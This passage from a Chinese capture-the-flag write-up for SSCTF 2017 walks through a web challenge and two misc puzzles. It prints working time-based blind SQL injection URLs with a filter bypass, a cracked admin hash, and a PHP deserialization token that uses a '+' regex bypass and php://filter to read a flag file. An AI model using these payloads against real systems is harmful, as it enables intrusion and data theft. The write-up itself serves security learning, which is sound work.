+<br/><img alt="" data-action="zoom" src="./SSCTF-2017-WEB-WriteUp/590e010bc65a904f8300000b.png" style="max-width:100%;height:auto;"/><br/></p>
+<p style="max-width:100%;height:auto;">做完之后不久，题目又修复命令执行。。。
+把正则换成这样</p>
+<p style="max-width:100%;height:auto;"><br/><img alt="" data-action="zoom" src="./SSCTF-2017-WEB-WriteUp/590e015cc65a904f8300000c.png" style="max-width:100%;height:auto;"/><br/></p>
+<p style="max-width:100%;height:auto;">这下应该很难绕过了。。。不过跟我没啥关系辣...XD...</p>
+<h2 id="web500cloverseclogos">web 500 CloverSec Logos</h2>
+<p style="max-width:100%;height:auto;">这道题首先进去简单逛了一圈，然后，后来在<code style="max-width:100%;height:auto;">picture.php</code>的id参数发现注入,poc如下：</p>
+<pre><code class="url language-url" style="max-width:100%;height:auto;">http://60.191.205.80/picture.php?id="%2b(select(sleep(6)))%2b"
+</code></pre>
+<p style="max-width:100%;height:auto;">然后就可以利用了，</p>
+<pre><code class="url language-url" style="max-width:100%;height:auto;">http://60.191.205.80/picture.php?id="%2b(if(substring(database(),1,1)&lt;&amp;apos;z&amp;apos;,1,0))%2b"
+</code></pre>
+<p style="max-width:100%;height:auto;">根据官方提示，有一个<code style="max-width:100%;height:auto;">user</code>表，字段是<code style="max-width:100%;height:auto;">username</code>,<code style="max-width:100%;height:auto;">password</code>，脚本都懒得写了，
+如下：</p>
+<pre><code class="url language-url" style="max-width:100%;height:auto;">http://60.191.205.80/picture.php?id="%2b(if(substring(username,1,1)&lt;&amp;apos;z&amp;apos;,1,0))%2b"
+</code></pre>
+<p style="max-width:100%;height:auto;">直接上burp跑，
+拿到用户名是<code style="max-width:100%;height:auto;">admin</code>：
+<br/><img alt="" data-action="zoom" src="./SSCTF-2017-WEB-WriteUp/590ebedb25ffbe56c4000000.png" style="max-width:100%;height:auto;"/><br/></p>
+<p style="max-width:100%;height:auto;">password需要注意，这里过滤了<code style="max-width:100%;height:auto;">or</code>，所以需要双写绕过</p>
+<pre><code class="url language-url" style="max-width:100%;height:auto;">http://60.191.205.80/picture.php?id="%2b(if(substring(passwoorrd,1,1)&lt;&amp;apos;z&amp;apos;,1,0))%2b"
+</code></pre>
+<p style="max-width:100%;height:auto;">跑出来是20位的密码<code style="max-width:100%;height:auto;">14aceb3fc5992cef3d97</code>
+<br/><img alt="" data-action="zoom" src="./SSCTF-2017-WEB-WriteUp/590ebf2f25ffbe56c4000001.png" style="max-width:100%;height:auto;"/><br/></p>
+<p style="max-width:100%;height:auto;">猜测和<code style="max-width:100%;height:auto;">dedecms</code>一样，去掉头三位和末一位<code style="max-width:100%;height:auto;">ceb3fc5992cef3d9</code>，md5解密出来是<code style="max-width:100%;height:auto;">admin^g</code>
+就能登陆进去了。
+然后进去之后看cookie拿到tip说token会被反序列化，根据提示说是有vim的残留文件，访问<code style="max-width:100%;height:auto;">.index.php.swp</code>,发现并没有什么有用的信息，，后来访问<code style="max-width:100%;height:auto;">index.php.swp</code>才拿到真正有用的文件，这里截出重点部分如下：</p>
+<pre><code class="php language-php" style="max-width:100%;height:auto;">if(isset($_GET[&amp;apos;action&amp;apos;])&amp;&amp;$_GET[&amp;apos;action&amp;apos;]==&amp;apos;imformation&amp;apos;)
+{
+    if(isset($_COOKIE[&amp;apos;token&amp;apos;]))
+    {
+      $secret=$_GET[&amp;apos;secret&amp;apos;];
+      $token =$_COOKIE[&amp;apos;token&amp;apos;];
+      if(isset($secret)&amp;&amp;(file_get_contents($secret,&amp;apos;r&amp;apos;)==="1234"))
+      {
+        echo "hello Hacker!&lt;br&gt;";
+        include("include.php");
+        echo ssctf_unserialize($token);
+      }
+      else
+      {
+        echo "You are not Hacker ! ";
+      }
+    }
+    else{
+      setcookie("token",&amp;apos;&amp;apos;);
+      echo &amp;apos;&lt;h2 style="text-align:center;"&gt;Welcome&lt;/h2&gt;&amp;apos;;
+      echo &amp;apos;&lt;div&gt;&lt;h4&gt;User imformation&lt;/h4&gt;&lt;ul&gt;&amp;apos;;
+      echo &amp;apos;&lt;li&gt;Username : &amp;apos;.$imformation[&amp;apos;username&amp;apos;].&amp;apos;&lt;/li&gt;&amp;apos;;
+    }
+}
+</code></pre>
+<p style="max-width:100%;height:auto;">发现反序列函数具体详情不知道，而又包含了一个<code style="max-width:100%;height:auto;">include.php</code>,访问下发现备份文件<code style="max-width:100%;height:auto;">http://60.191.205.80/include.php.swp</code>,内容如下：</p>
+<pre><code class="php language-php" style="max-width:100%;height:auto;">&lt;?php 
+class Read{//ssctf_flag.php
+    public $file;
+    public function __toString(){
+
+        if(isset($this-&gt;file)){
+            if("ssctf_flag.php"===$this-&gt;file)
+            {
+                exit();  
+            }
+            else
+            {
+                echo file_get_contents($this-&gt;file); 
+            }
+
+        }
+        return "you are big Hacker";
+    }
+}
+function ssctf_unserialize($value)
+    {
+        preg_match(&amp;apos;/[oc]:\d+:/i&amp;apos;, $value,$matches);
+          if(count($matches)){
+              return false;
+        }
+          return unserialize($value);
+    }
+?&gt;
+</code></pre>
+<p style="max-width:100%;height:auto;">这个反序列化的正则绕过非常眼熟，只要复现过之前 <a href="http://bendawang.site/article/__wakeup()%E5%87%BD%E6%95%B0%E5%A4%B1%E6%95%88%E5%BC%95%E5%8F%91%E6%BC%8F%E6%B4%9E(CVE-2016-7124">__wakeup() 函数失效引发漏洞</a>) 就会有印象的，一个<code style="max-width:100%;height:auto;">+</code>就能绕过了,其他都是一些常见的trick就不赘述了，最后payload如下：</p>
+<p style="max-width:100%;height:auto;"><br/><img alt="" data-action="zoom" src="./SSCTF-2017-WEB-WriteUp/590ec28593742a2f44000000.png" style="max-width:100%;height:auto;"/><br/></p>
+<p style="max-width:100%;height:auto;">其中token为：</p>
+<pre><code class="url language-url" style="max-width:100%;height:auto;">O%3a%2b4%3a"Read"%3a1%3a{s%3a4%3a"file"%3bs%3a63%3a"php%3a//filter/read%3dconvert.base64-encode/resource%3dssctf_flag.php"%3b}
+</code></pre>
+<h2 id="misc50">misc 50 签到题</h2>
+<p style="max-width:100%;height:auto;">给了一串base64，解密之后是个奇怪的串，栅栏爆破一下：</p>
+<pre><code class="php language-php" style="max-width:100%;height:auto;"># encoding:utf-8
+cipher=&amp;apos;Z2dRQGdRMWZxaDBvaHRqcHRfc3d7Z2ZoZ3MjfQ==&amp;apos;
+cipher=cipher.decode("base64")
+length=len(cipher)
+num=[]
+for i in range(1,length):
+    if(length%i==0):
+        num.append(i)
+for i in num:
+    b=length/i
+    plantext={x:&amp;apos;&amp;apos; for x in range(b)}
+    for j in range(length):
+        a=j%b;
+        plantext.update({a:plantext[a]+cipher[j]})
+    d =&amp;apos;&amp;apos;
+    for j in range(b):
+        d = d+plantext[j]
+    print "====================================================="
+    print str(i)+":"+d
+&amp;apos;&amp;apos;&amp;apos;
+result:
+=====================================================
+1:ggQ@gQ1fqh0ohtjpt_sw{gfhgs#}
+=====================================================
+2:gjgpQt@_gsQw1{fgqfhh0gosh#t}
+=====================================================
+4:gfjggqpfQhth@0_ggossQhw#1t{}
+=====================================================
+7:ggqht{ggQht_gsQ10jsf#@fopwh}
+=====================================================
+14:gQg1q0hjts{fg#g@Qfhotp_wghs}
+
+&amp;apos;&amp;apos;&amp;apos;
+</code></pre>
+<p style="max-width:100%;height:auto;">然后再试试凯撒，发现<code style="max-width:100%;height:auto;">ggqht{ggQht_gsQ10jsf#@fopwh}</code>经过<code style="max-width:100%;height:auto;">rot-12</code>之后得到flag:<code style="max-width:100%;height:auto;">ssctf{ssCtf_seC10ver#@rabit}</code></p>
+<h2 id="misc100flag">misc 100 flag在哪里</h2>
+<p style="max-width:100%;height:auto;">首先是个流量包，简单分析下请求包，发现是git的相关文件，不过改成了<code style="max-width:100%;height:auto;">.nijiakadaye</code>，一样的dump下来，然后看看<code style="max-width:100%;height:auto;">git log</code>
+<br/><img alt="" data-action="zoom" src="./SSCTF-2017-WEB-WriteUp/590d64acc65a904f83000000.png" style="max-width:100%;height:auto;"/><br/></p>
+<p style="max-width:100%;height:auto;">在<code style="max-width:100%;height:auto;">8894bb4d45643d52b5eb8175710999fcd398ebd4</code>分支下拿到一串奇怪的flag：<code style="max-width:100%;height:auto;">SSCTF{xsL3HOvFlV+H40s0mhszc5t1x38EU0ZIFJHZ/h2sC3U=}</code>，
+然后在往前看，在<code style="max-width:100%;height:auto;">9ab1451776fb32e82c2524fc4f37fa3f33ceae2f</code>分支下拿到<code style="max-width:100%;height:auto;">pass.php</code>,很容易知道上面那个flag是被这个加密的，然后发现这其实是个RC4加密，RC4加密解密一样的，即再加密一遍就能拿到flag,:</p>
+<pre><code class="php language-php" style="max-width:100%;height:auto;">&lt;?php
+$cipher="xsL3HOvFlV+H40s0mhszc5t1x38EU0ZIFJHZ/h2sC3U=";
+$pwd="ssctf";
+
+function wtf($data,$pwd) {
+    $cipher ="";
+    $key[] ="";
+    $box[] ="";
+    $pwd_length = strlen($pwd);
+    $data_length = strlen($data);
+    for ($i = 0; $i &lt; 256; $i++) {
+        $key[$i] = ord($pwd[$i % $pwd_length]);
+        $box[$i] = $i;
+    }
+    for ($j = $i = 0; $i &lt; 256; $i++) {
+        $j = ($j + $box[$i] + $key[$i]) % 256;
+        $tmp = $box[$i];
+        $box[$i] = $box[$j];
+        $box[$j] = $tmp;
+    }
+    for ($a = $j = $i = 0; $i &lt; $data_length; $i++) {
+        $a = ($a + 1) % 256;
+        $j = ($j + $box[$a]) % 256;
+        $tmp = $box[$a];
+        $box[$a] = $box[$j];
+        $box[$j] = $tmp;
+        $k = $box[(($box[$a] + $box[$j]) % 256)];
+        $cipher .= chr(ord($data[$i]) ^ $k);
+    }
+    return $cipher;
+}
+echo wtf(base64_decode($cipher),$pwd);
+
+?&gt;
+</code></pre>
+<p style="max-width:100%;height:auto;">所以flag如下：
+<br/><img alt="" data-action="zoom" src="./SSCTF-2017-WEB-WriteUp/590d6564c65a904f83000001.png" style="max-width:100%;height:auto;"/><br/></p>
+<div class="section-nav">
+<div class="left align-right"></div>
+<div class="right align-left"></div>
+<div class="clear"></div>
+</div>
+</article>
+</div>
+<div class="unit one-fifth hide-on-mobiles godness">
+<aside>
+<div class="Bendawang" id="Bendawang" style="position:absolute;">
+<b id="Bendawang_toggle" style="cursor:pointer;" title="收起">目录[+]</b></div></aside></div>
+<div class="Bendawang_content" id="Bendawang_content"></div>
+
+<img class="yukino" id="yukino" src="static/images/yukino/41.png" style="position:absolute;"/>
+
+
+
+
+<footer>
+<div class="show-on-mobiles">
+<div style="display:inline-block">
+<div style="vertical-align:middle;">
+            Copyright©
+            <span itemprop="copyrightYear">2017</span>
+<span class="author" itemprop="copyrightHolder"><a href="http://bendawang.site/" style="font-size:16px">Bendawang</a></span>
+</div>
+</div>
+<div style="vertical-align:middle;">
+<span>Designed By</span>
+<a href="http://blog.csdn.net/qq_19876131"><img src="./SSCTF-2017-WEB-WriteUp/bendawang2.png"/></a>
+</div>
+</div>
+<div class="grid hide-on-mobiles">
+<div class="unit one-third center-on-mobiles">
+<div class="copyright">
+          Copyright©
+          <span itemprop="copyrightYear">2017</span>
+<span class="author" itemprop="copyrightHolder">   <a href="http://bendawang.site/">Bendawang</a></span>
+</div>
+</div>
+<div class="unit two-thirds align-right center-on-mobiles">
+<p>Designed By
+          <a href="http://blog.csdn.net/qq_19876131">
+<img src="/static/images/bendawang2.png"/>
+</a>
+</p>
+</div>
+</div>
+</footer>
+<script src="./SSCTF-2017-WEB-WriteUp/prism.js"></script>
+<script src="./SSCTF-2017-WEB-WriteUp/zooming.js"></script>
+<script src="./SSCTF-2017-WEB-WriteUp/Bendawang.js"></script>
+
+
